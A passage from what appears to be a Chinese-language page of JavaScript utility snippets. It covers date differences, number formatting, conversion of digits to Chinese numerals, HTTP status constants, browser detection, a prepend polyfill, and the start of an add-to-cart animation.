  <span>const</span> start <span>=</span> <span>moment</span><span>(</span>startDate<span>)</span><span>;</span>
  <span>const</span> end <span>=</span> <span>moment</span><span>(</span>endDate<span>)</span><span>;</span>
  <span>const</span> diffDays <span>=</span> end<span>.</span><span>diff</span><span>(</span>start<span>,</span> <span>"days"</span><span>,</span> <span>true</span><span>)</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span><span>;</span>
  <span>const</span> diffYears <span>=</span> Math<span>.</span><span>floor</span><span>(</span>diffDays <span>/</span> <span>365</span><span>)</span><span>;</span>

  <span>let</span> str <span>=</span> <span>""</span><span>;</span>
  <span>if</span> <span>(</span>diffYears<span>)</span> <span>{</span>
    str <span>=</span> <span><span>`</span><span><span>${</span>diffYears<span>}</span></span><span> 年 </span><span><span>${</span>diffDays <span>-</span> diffYears <span>*</span> <span>365</span> <span>+</span> <span>1</span><span>}</span></span><span> 天</span><span>`</span></span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    str <span>=</span> <span><span>`</span><span><span>${</span>Math<span>.</span><span>floor</span><span>(</span>diffDays<span>)</span> <span>+</span> <span>1</span><span>}</span></span><span> 天</span><span>`</span></span><span>;</span>
  <span>}</span>
  <span>return</span> str<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="数值格式化" tabindex="-1"> 数值格式化</h3>
<div><pre><code><span>/**
 * <span>@methods</span> formatNumber 数值按一定的规则进行格式化
 *
 * <span>@param</span> <span><span>{</span>Number<span>}</span></span> <span>apart</span> 相隔几个数字
 * <span>@param</span> <span><span>{</span>Number<span>}</span></span> <span>separator</span> 添加的字符
 * <span>@param</span> <span><span>{</span>Number<span>|</span>String<span>}</span></span> <span>value</span> 纯数字或者数字字符串
 *
 * <span>@return</span> <span><span>{</span>String<span>}</span></span> 格式化好的字符串
 */</span>
<span>formatNumber</span><span>(</span><span>{</span>
    apart <span>=</span> <span>3</span><span>,</span>
    separator <span>=</span> <span>','</span><span>,</span>
    value
<span>}</span> <span>=</span> <span>{</span><span>}</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>Number</span><span>(</span>value<span>)</span> <span>&amp;&amp;</span> value<span>)</span> <span>{</span>
        console<span>.</span><span>warn</span><span>(</span><span>'你未正确传递值'</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> rgx <span>=</span> <span>new</span> <span>RegExp</span><span>(</span> <span><span>`</span><span>(\\d+)(\\d{</span><span><span>${</span>apart<span>}</span></span><span>})</span><span>`</span></span> <span>)</span>
        <span>const</span> refValue <span>=</span> <span>String</span><span>(</span>value<span>)</span>
        <span>const</span> x <span>=</span> refValue<span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span>
        <span>let</span> x1 <span>=</span> x<span>[</span><span>0</span><span>]</span>
        <span>const</span> x2 <span>=</span> x<span>.</span>length <span>></span> <span>1</span> <span>?</span> <span>'.'</span> <span>+</span> x<span>[</span><span>1</span><span>]</span> <span>:</span> <span>''</span>

        <span>while</span> <span>(</span>rgx<span>.</span><span>test</span><span>(</span>x1<span>)</span><span>)</span> <span>{</span>
            x1 <span>=</span> x1<span>.</span><span>replace</span><span>(</span>rgx<span>,</span> <span>'$1'</span> <span>+</span> separator <span>+</span> <span>'$2'</span><span>)</span>
        <span>}</span>
        <span>return</span> x1 <span>+</span> x2
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// 数字转中文</span>
<span>export</span> <span>const</span> <span>chinanum</span> <span>=</span> <span>(</span><span>digit</span><span>)</span> <span>=></span> <span>{</span>
  digit <span>=</span> <span>typeof</span> digit <span>===</span> <span>"number"</span> <span>?</span> <span>String</span><span>(</span>digit<span>)</span> <span>:</span> digit<span>;</span>
  <span>const</span> zh <span>=</span> <span>[</span><span>"零"</span><span>,</span> <span>"一"</span><span>,</span> <span>"二"</span><span>,</span> <span>"三"</span><span>,</span> <span>"四"</span><span>,</span> <span>"五"</span><span>,</span> <span>"六"</span><span>,</span> <span>"七"</span><span>,</span> <span>"八"</span><span>,</span> <span>"九"</span><span>]</span><span>;</span>
  <span>const</span> unit <span>=</span> <span>[</span><span>"千"</span><span>,</span> <span>"百"</span><span>,</span> <span>"十"</span><span>,</span> <span>""</span><span>]</span><span>;</span>
  <span>const</span> quot <span>=</span> <span>[</span>
    <span>"万"</span><span>,</span>
    <span>"亿"</span><span>,</span>
    <span>"兆"</span><span>,</span>
    <span>"京"</span><span>,</span>
    <span>"垓"</span><span>,</span>
    <span>"秭"</span><span>,</span>
    <span>"穰"</span><span>,</span>
    <span>"沟"</span><span>,</span>
    <span>"涧"</span><span>,</span>
    <span>"正"</span><span>,</span>
    <span>"载"</span><span>,</span>
    <span>"极"</span><span>,</span>
    <span>"恒河沙"</span><span>,</span>
    <span>"阿僧祗"</span><span>,</span>
    <span>"那由他"</span><span>,</span>
    <span>"不可思议"</span><span>,</span>
    <span>"无量"</span><span>,</span>
    <span>"大数"</span><span>,</span>
  <span>]</span><span>;</span>
  <span>let</span> breakLen <span>=</span> Math<span>.</span><span>ceil</span><span>(</span>digit<span>.</span>length <span>/</span> <span>4</span><span>)</span><span>;</span>
  <span>let</span> notBreakSegment <span>=</span> digit<span>.</span>length <span>%</span> <span>4</span> <span>||</span> <span>4</span><span>;</span>
  <span>let</span> segment<span>;</span>
  <span>const</span> zeroFlag <span>=</span> <span>[</span><span>]</span><span>;</span>
  <span>const</span> allZeroFlag <span>=</span> <span>[</span><span>]</span><span>;</span>
  <span>let</span> result <span>=</span> <span>""</span><span>;</span>
  <span>while</span> <span>(</span>breakLen <span>></span> <span>0</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>result<span>)</span> <span>{</span>
      <span>// 第一次执行</span>
      segment <span>=</span> digit<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> notBreakSegment<span>)</span><span>;</span>
      <span>const</span> segmentLen <span>=</span> segment<span>.</span>length<span>;</span>
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> segmentLen<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>segment<span>[</span>i<span>]</span> <span>!==</span> <span>0</span><span>)</span> <span>{</span>
          <span>if</span> <span>(</span>zeroFlag<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
            result <span>+=</span> <span>"零"</span> <span>+</span> zh<span>[</span>segment<span>[</span>i<span>]</span><span>]</span> <span>+</span> unit<span>[</span><span>4</span> <span>-</span> segmentLen <span>+</span> i<span>]</span><span>;</span>
            <span>// 判断是否需要加上 quot 单位</span>
            <span>if</span> <span>(</span>i <span>===</span> segmentLen <span>-</span> <span>1</span> <span>&amp;&amp;</span> breakLen <span>></span> <span>1</span><span>)</span> <span>{</span>
              result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>2</span><span>]</span><span>;</span>
            <span>}</span>
            zeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
          <span>}</span> <span>else</span> <span>{</span>
            result <span>+=</span> zh<span>[</span>segment<span>[</span>i<span>]</span><span>]</span> <span>+</span> unit<span>[</span><span>4</span> <span>-</span> segmentLen <span>+</span> i<span>]</span><span>;</span>
            <span>if</span> <span>(</span>i <span>===</span> segmentLen <span>-</span> <span>1</span> <span>&amp;&amp;</span> breakLen <span>></span> <span>1</span><span>)</span> <span>{</span>
              result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>2</span><span>]</span><span>;</span>
            <span>}</span>
          <span>}</span>
        <span>}</span> <span>else</span> <span>{</span>
          <span>// 处理为 0 的情形</span>
          <span>if</span> <span>(</span>segmentLen <span>===</span> <span>1</span><span>)</span> <span>{</span>
            result <span>+=</span> zh<span>[</span>segment<span>[</span>i<span>]</span><span>]</span><span>;</span>
            <span>break</span><span>;</span>
          <span>}</span>
          zeroFlag<span>.</span><span>push</span><span>(</span>segment<span>[</span>i<span>]</span><span>)</span><span>;</span>
          <span>continue</span><span>;</span>
        <span>}</span>
      <span>}</span>
    <span>}</span> <span>else</span> <span>{</span>
      segment <span>=</span> digit<span>.</span><span>slice</span><span>(</span>notBreakSegment<span>,</span> notBreakSegment <span>+</span> <span>4</span><span>)</span><span>;</span>
      notBreakSegment <span>+=</span> <span>4</span><span>;</span>
      <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> segment<span>.</span>length<span>;</span> j<span>++</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>segment<span>[</span>j<span>]</span> <span>!==</span> <span>0</span><span>)</span> <span>{</span>
          <span>if</span> <span>(</span>zeroFlag<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
            <span>// 第一次执行zeroFlag长度不为0, 说明上一个分区最后有0待处理</span>
            <span>if</span> <span>(</span>j <span>===</span> <span>0</span><span>)</span> <span>{</span>
              result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>1</span><span>]</span> <span>+</span> zh<span>[</span>segment<span>[</span>j<span>]</span><span>]</span> <span>+</span> unit<span>[</span>j<span>]</span><span>;</span>
            <span>}</span> <span>else</span> <span>{</span>
              result <span>+=</span> <span>"零"</span> <span>+</span> zh<span>[</span>segment<span>[</span>j<span>]</span><span>]</span> <span>+</span> unit<span>[</span>j<span>]</span><span>;</span>
            <span>}</span>
            zeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
          <span>}</span> <span>else</span> <span>{</span>
            result <span>+=</span> zh<span>[</span>segment<span>[</span>j<span>]</span><span>]</span> <span>+</span> unit<span>[</span>j<span>]</span><span>;</span>
          <span>}</span>
          <span>// 判断是否需要加上 quot 单位</span>
          <span>if</span> <span>(</span>j <span>===</span> segment<span>.</span>length <span>-</span> <span>1</span> <span>&amp;&amp;</span> breakLen <span>></span> <span>1</span><span>)</span> <span>{</span>
            result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>2</span><span>]</span><span>;</span>
          <span>}</span>
        <span>}</span> <span>else</span> <span>{</span>
          <span>// 第一次执行如果zeroFlag长度不为0, 且上一划分不全为0</span>
          <span>if</span> <span>(</span>j <span>===</span> <span>0</span> <span>&amp;&amp;</span> zeroFlag<span>.</span>length <span>></span> <span>0</span> <span>&amp;&amp;</span> allZeroFlag<span>.</span>length <span>===</span> <span>0</span><span>)</span> <span>{</span>
            result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>1</span><span>]</span><span>;</span>
            zeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
            zeroFlag<span>.</span><span>push</span><span>(</span>segment<span>[</span>j<span>]</span><span>)</span><span>;</span>
          <span>}</span> <span>else</span> <span>if</span> <span>(</span>allZeroFlag<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
            <span>// 执行到最后</span>
            <span>if</span> <span>(</span>breakLen <span>===</span> <span>1</span><span>)</span> <span>{</span>
              result <span>+=</span> <span>""</span><span>;</span>
            <span>}</span> <span>else</span> <span>{</span>
              zeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
            <span>}</span>
          <span>}</span> <span>else</span> <span>{</span>
            zeroFlag<span>.</span><span>push</span><span>(</span>segment<span>[</span>j<span>]</span><span>)</span><span>;</span>
          <span>}</span>
          <span>if</span> <span>(</span>
            j <span>===</span> segment<span>.</span>length <span>-</span> <span>1</span> <span>&amp;&amp;</span>
            zeroFlag<span>.</span>length <span>===</span> <span>4</span> <span>&amp;&amp;</span>
            breakLen <span>!==</span> <span>1</span>
          <span>)</span> <span>{</span>
            <span>// 如果执行到末尾</span>
            <span>if</span> <span>(</span>breakLen <span>===</span> <span>1</span><span>)</span> <span>{</span>
              allZeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
              zeroFlag<span>.</span>length <span>=</span> <span>0</span><span>;</span>
              result <span>+=</span> quot<span>[</span>breakLen <span>-</span> <span>1</span><span>]</span><span>;</span>
            <span>}</span> <span>else</span> <span>{</span>
              allZeroFlag<span>.</span><span>push</span><span>(</span>segment<span>[</span>j<span>]</span><span>)</span><span>;</span>
            <span>}</span>
          <span>}</span>
          <span>continue</span><span>;</span>
        <span>}</span>
      <span>}</span>

      <span>--</span>breakLen<span>;</span>
    <span>}</span>
    <span>return</span> result<span>;</span>
  <span>}</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="常量" tabindex="-1"> 常量</h2>
<h3 id="http-状态信息" tabindex="-1"> HTTP 状态信息</h3>
<div><pre><code><span>export</span> <span>const</span> <span>SUCCESS</span> <span>=</span> <span>{</span>
  <span>status</span><span>:</span> <span>200</span><span>,</span>
  <span>message</span><span>:</span> <span>"成功"</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>const</span> <span>UNAUTHORIZED</span> <span>=</span> <span>{</span>
  <span>sattus</span><span>:</span> <span>401</span><span>,</span>
  <span>message</span><span>:</span> <span>"无效或者过期的 token"</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>const</span> <span>FORBIDDEN</span> <span>=</span> <span>{</span>
  <span>sattus</span><span>:</span> <span>403</span><span>,</span>
  <span>message</span><span>:</span> <span>"没有访问权限"</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>const</span> <span>NOT_FOUNED</span> <span>=</span> <span>{</span>
  <span>sattus</span><span>:</span> <span>404</span><span>,</span>
  <span>message</span><span>:</span> <span>"页面不存在或者已经被移除了"</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>const</span> <span>UNPROCESSABLE_ENTITY</span> <span>=</span> <span>{</span>
  <span>status</span><span>:</span> <span>422</span><span>,</span>
  <span>message</span><span>:</span> <span>"无效的表单数据或者未填写完整的表单"</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>const</span> <span>INTERNAL_SERVER_ERROR</span> <span>=</span> <span>{</span>
  <span>status</span><span>:</span> <span>500</span><span>,</span>
  <span>message</span><span>:</span> <span>"服务器内部发生不可抗拒的错误"</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="兼容处理" tabindex="-1"> 兼容处理</h2>
<h3 id="当前使用的浏览器" tabindex="-1"> 当前使用的浏览器</h3>
<div><pre><code><span>const</span> userAgent <span>=</span> navigator<span>.</span>userAgent<span>;</span> <span>// 取得浏览器的userAgent字符串</span>
<span>const</span> <span>compare</span> <span>=</span> <span>(</span><span>s</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> userAgent<span>.</span><span>indexOf</span><span>(</span>s<span>)</span> <span>></span> <span>-</span><span>1</span><span>;</span>
<span>}</span><span>;</span>
<span>if</span> <span>(</span><span>compare</span><span>(</span><span>"Chrome"</span><span>)</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>compare</span><span>(</span><span>"Edge"</span><span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>"Edge"</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>"Chrome"</span><span>;</span>
<span>}</span>
<span>if</span> <span>(</span><span>compare</span><span>(</span><span>"Opera"</span><span>)</span><span>)</span> <span>{</span>
  <span>return</span> <span>"Opera"</span><span>;</span>
<span>}</span>
<span>if</span> <span>(</span><span>compare</span><span>(</span><span>"Safari"</span><span>)</span><span>)</span> <span>{</span>
  <span>return</span> <span>"Safari"</span><span>;</span>
<span>}</span>
<span>if</span> <span>(</span><span>compare</span><span>(</span><span>"Firefox"</span><span>)</span><span>)</span> <span>{</span>
  <span>return</span> <span>"Firefox"</span><span>;</span>
<span>}</span>
<span>if</span> <span>(</span><span>compare</span><span>(</span><span>"compatible"</span><span>)</span> <span>||</span> <span>compare</span><span>(</span><span>"MSIE"</span><span>)</span> <span>||</span> <span>compare</span><span>(</span><span>"Trident"</span><span>)</span><span>)</span> <span>{</span>
  <span>return</span> <span>"IE"</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="prepend" tabindex="-1"> prepend</h3>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/ParentNode/prepend#Polyfill" target="_blank" rel="noopener noreferrer">MDN ParentNode.prepend</a></p>
<div><pre><code><span>(</span><span>function</span> <span>(</span><span>arr</span><span>)</span> <span>{</span>
  arr<span>.</span><span>forEach</span><span>(</span><span>function</span> <span>(</span><span>item</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>item<span>.</span><span>hasOwnProperty</span><span>(</span><span>"prepend"</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span><span>;</span>
    <span>}</span>
    Object<span>.</span><span>defineProperty</span><span>(</span>item<span>,</span> <span>"prepend"</span><span>,</span> <span>{</span>
      <span>configurable</span><span>:</span> <span>true</span><span>,</span>
      <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
      <span>writable</span><span>:</span> <span>true</span><span>,</span>
      <span>value</span><span>:</span> <span>function</span> <span>prepend</span><span>(</span><span>)</span> <span>{</span>
        <span>var</span> argArr <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span><span>slice</span><span>.</span><span>call</span><span>(</span>arguments<span>)</span><span>;</span>
        <span>var</span> docFrag <span>=</span> document<span>.</span><span>createDocumentFragment</span><span>(</span><span>)</span><span>;</span>

        argArr<span>.</span><span>forEach</span><span>(</span><span>function</span> <span>(</span><span>argItem</span><span>)</span> <span>{</span>
          <span>var</span> isNode <span>=</span> argItem <span>instanceof</span> <span>Node</span><span>;</span>
          docFrag<span>.</span><span>appendChild</span><span>(</span>
            isNode <span>?</span> argItem <span>:</span> document<span>.</span><span>createTextNode</span><span>(</span><span>String</span><span>(</span>argItem<span>)</span><span>)</span>
          <span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>

        <span>this</span><span>.</span><span>insertBefore</span><span>(</span>docFrag<span>,</span> <span>this</span><span>.</span>firstChild<span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>(</span><span>[</span><span>Element</span><span>.</span>prototype<span>,</span> <span>Document</span><span>.</span>prototype<span>,</span> <span>DocumentFragment</span><span>.</span>prototype<span>]</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="添加至购物车效果" tabindex="-1"> 添加至购物车效果</h2>
<p><a href="https://github.com/bigwave-cl/shopping-cart-animation" target="_blank" rel="noopener noreferrer">参考传送门: 利用 animation 和 transform 制作加入购物车动画</a></p>
<div><pre><code><span>const</span> <span>ballFly</span> <span>=</span> <span>function</span> <span>(</span><span>opt</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>const</span> <span>Parabola</span> <span>=</span> <span>function</span> <span>(</span><span>opt</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>init</span><span>(</span>opt<span>)</span><span>;</span>
    <span>}</span><span>;</span>

    <span>Parabola</span><span>.</span>prototype <span>=</span> <span>{</span>
      <span>init</span><span>:</span> <span>function</span> <span>(</span><span>opt</span><span>)</span> <span>{</span>
        <span>// console.log(opt)</span>
        <span>let</span> flyO <span>=</span> <span>this</span><span>.</span><span>calculatedValue</span><span>(</span>opt<span>)</span><span>;</span>
        <span>let</span> flyDom <span>=</span> <span>this</span><span>.</span><span>creatHtml</span><span>(</span>flyO<span>.</span>site<span>,</span> flyO<span>.</span>callback<span>)</span><span>;</span>
        <span>let</span> flyRule <span>=</span> <span>this</span><span>.</span><span>creatRule</span><span>(</span>flyO<span>.</span>coord<span>)</span><span>;</span>

        document<span>.</span><span>getElementsByTagName</span><span>(</span><span>"head"</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span><span>appendChild</span><span>(</span>flyRule<span>)</span><span>;</span>
        document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>flyDom<span>)</span><span>;</span>
      <span>}</span><span>,</span>
      <span>creatRule</span><span>:</span> <span>function</span> <span>(</span><span>coord</span><span>)</span> <span>{</span>
        <span>var</span> cssAnimation <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"style"</span><span>)</span><span>;</span>
        cssAnimation<span>.</span>type <span>=</span> <span>"text/css"</span><span>;</span>
        <span>var</span> rules <span>=</span> <span><span>`</span><span>
          .parabola-animation {
            width: 100%;
          }

          .parabola-box-hor {
            position: fixed;
            z-index: 99;
            top: 0;
            left: 0;
            -webkit-animation: parabola-hor-animation 1s ease-out 1;
            animation: parabola-hor-animation 1s ease-out 1;
          }

          .parabola-box-hor.top {
            -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in;
          }

          .parabola-box-ver {
            position: fixed;
            top: 50px;
            left: 20px;
            overflow: hidden;
            // width: 35px;
            // height: 35px;
            // background-color: red;
            -webkit-animation: parabola-ver-animation 1s ease-in 1;
            animation: parabola-ver-animation 1s ease-in 1;
            border-radius: 50%;
          }

          .parabola-box-ver.top {
            -webkit-animation-timing-function: ease-out;
            animation-timing-function: ease-out;
          }

          @-webkit-keyframes parabola-hor-animation{
              0%{
                  -webkit-transform: translate(0px, 0px);
                          transform: translate(0px, 0px);
              }
              10%{
                  -webkit-transform: translate(0px, 0px);
                          transform: translate(0px, 0px);
              }
              100%{
                  -webkit-transform: translate(</span><span><span>${</span>coord<span>.</span>x<span>}</span></span><span>px, 0px);
                          transform: translate(</span><span><span>${</span>coord<span>.</span>x<span>}</span></span><span>px, 0px);
              }
          }
          @keyframes parabola-hor-animation{
              0%{
                  -webkit-transform: translate(0px, 0px);
                          transform: translate(0px, 0px);
              }
              10%{
                  -webkit-transform: translate(0px, 0px);
                          transform: translate(0px, 0px);
              }
              100%{
                  -webkit-transform: translate(</span><span><span>${</span>coord<span>.</span>x<span>}</span></span><span>px, 0px);
                          transform: translate(</span><span><span>${</span>coord<span>.</span>x<span>}</span></span><span>px, 0px);
              }
          }
            @-webkit-keyframes parabola-ver-animation{
                0%{
                    -webkit-transform: translate(0px, 0px);
                            transform: translate(0px, 0px);
                }
                10%{
                    -webkit-transform: translate(0px, </span><span><span>${</span>coord<span>.</span>os<span>}</span></span><span>px);
                            transform: translate(0px, </span><span><span>${</span>coord<span>.</span>os<span>}</span></span><span>px);
                }
                100%{
                    -webkit-transform: translate(0px, </span><span><span>${</span>coord<span>.</span>y<span>}</span></span><span>px);
                            transform: translate(0px, </span><span><span>${</span>coord<span>.</span>y<span>}</span></span><span>px);
                }
            }
            @keyframes parabola-ver-animation{
                0%{
                    -webkit-transform: translate(0px, 0px);
                            transform: translate(0px, 0px);
                }
                10%{
                    -webkit-transform: translate(0px, </span><span><span>${</span>coord<span>.</span>os<span>}</span></span><span>px);
                            transform: translate(0px, </span><span><span>${</span>coord<span>.</span>os<span>}</span></span><span>px);
                }
                100%{
                    -webkit-transform: translate(0px, </span><span><span>${</span>coord<span>.</span>y<span>}</span></span><span>px);
                            transform: translate(0px, </span><span><span>${</span>coord<span>.</span>y<span>}</span></span><span>px);
                }
            }
        </span><span>`</span></span><span>;</span>
        cssAnimation<span>.</span>innerHTML <span>=</span> rules<span>;</span>
        <span>return</span> cssAnimation<span>;</span>
      <span>}</span><span>,</span>
      <span>creatHtml</span><span>:</span> <span>function</span> <span>(</span><span>site<span>,</span> callback</span><span>)</span> <span>{</span>
        <span>let</span> html <span>=</span> <span><span>`</span><span>
          &lt;div>
            &lt;div>
            &lt;/div>
          &lt;/div>
        </span><span>`</span></span><span>;</span>
        <span>let</span> parentBox <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"div"</span><span>)</span><span>;</span>
        parentBox<span>.</span>innerHTML <span>=</span> html<span>;</span>
        parentBox<span>.</span><span>setAttribute</span><span>(</span><span>"class"</span><span>,</span> <span>"parabola-animation"</span><span>)</span><span>;</span>

        <span>const</span> event <span>=</span> <span>[</span>
          <span>"webkitAnimationEnd"</span><span>,</span>
          <span>"mozAnimationEnd"</span><span>,</span>
          <span>"MSAnimationEnd"</span><span>,</span>
          <span>"oanimationend"</span><span>,</span>
          <span>"animationend"</span><span>,</span>
        <span>]</span><span>;</span>
        event<span>.</span><span>forEach</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
          parentBox<span>.</span><span>addEventListener</span><span>(</span>item<span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            parentBox<span>.</span><span>remove</span><span>(</span><span>)</span><span>;</span>
            <span>callback</span><span>(</span><span>)</span><span>;</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>

        <span>let</span> frag <span>=</span> document<span>.</span><span>createDocumentFragment</span><span>(</span><span>)</span><span>;</span>
        frag<span>.</span><span>appendChild</span><span>(</span>parentBox<span>)</span><span>;</span>

        <span>let</span> verBox <span>=</span> frag<span>.</span><span>querySelector</span><span>(</span><span>".parabola-box-ver"</span><span>)</span><span>;</span>
        <span>let</span> horBpx <span>=</span> frag<span>.</span><span>querySelector</span><span>(</span><span>".parabola-box-hor"</span><span>)</span><span>;</span>
        verBox<span>.</span>style<span>.</span>left <span>=</span> site<span>.</span>left <span>+</span> <span>"px"</span><span>;</span>
        verBox<span>.</span>style<span>.</span>top <span>=</span> site<span>.</span>top <span>+</span> <span>"px"</span><span>;</span>
        verBox<span>.</span>style<span>.</span>width <span>=</span> opt<span>.</span>size <span>+</span> <span>"px"</span><span>;</span>
        verBox<span>.</span>style<span>.</span>height <span>=</span> opt<span>.</span>size <span>+</span> <span>"px"</span><span>;</span>
        verBox<span>.</span>style<span>.</span>backgroundColor <span>=</span> opt<span>.</span>color<span>;</span>

        <span>if</span> <span>(</span>site<span>.</span>cubic<span>)</span> <span>{</span>
          verBox<span>.</span><span>setAttribute</span><span>(</span><span>"class"</span><span>,</span> <span>"parabola-box-ver top"</span><span>)</span><span>;</span>
          horBpx<span>.</span><span>setAttribute</span><span>(</span><span>"class"</span><span>,</span> <span>"parabola-box-hor top"</span><span>)</span><span>;</span>
        <span>}</span>

        <span>return</span> frag<span>;</span>
      <span>}</span><span>,</span>
      <span>calculatedValue</span><span>:</span> <span>function</span> <span>(</span><span>opt</span><span>)</span> <span>{</span>
        <span>let</span> fly <span>=</span> <span>{</span>
          <span>begin</span><span>:</span> <span>""</span><span>,</span>
          <span>end</span><span>:</span> <span>""</span><span>,</span>
          <span>size</span><span>:</span> <span>12</span><span>,</span>
          <span>color</span><span>:</span> <span>"#f9666b"</span><span>,</span>
          <span>callback</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>"动画完成"</span><span>)</span><span>;</span>
          <span>}</span><span>,</span>
        <span>}</span><span>;</span>
        <span>let</span> vData <span>=</span> <span>{</span>
          <span>site</span><span>:</span> <span>{</span>
            <span>left</span><span>:</span> <span>0</span><span>,</span>
            <span>top</span><span>:</span> <span>0</span><span>,</span>
            <span>cubic</span><span>:</span> <span>false</span><span>,</span>
          <span>}</span><span>,</span>
          <span>coord</span><span>:</span> <span>{</span>
            <span>x</span><span>:</span> <span>0</span><span>,</span>
            <span>y</span><span>:</span> <span>0</span><span>,</span>
            <span>os</span><span>:</span> <span>0</span><span>,</span>
          <span>}</span><span>,</span>
          <span>callback</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
        <span>}</span><span>;</span>

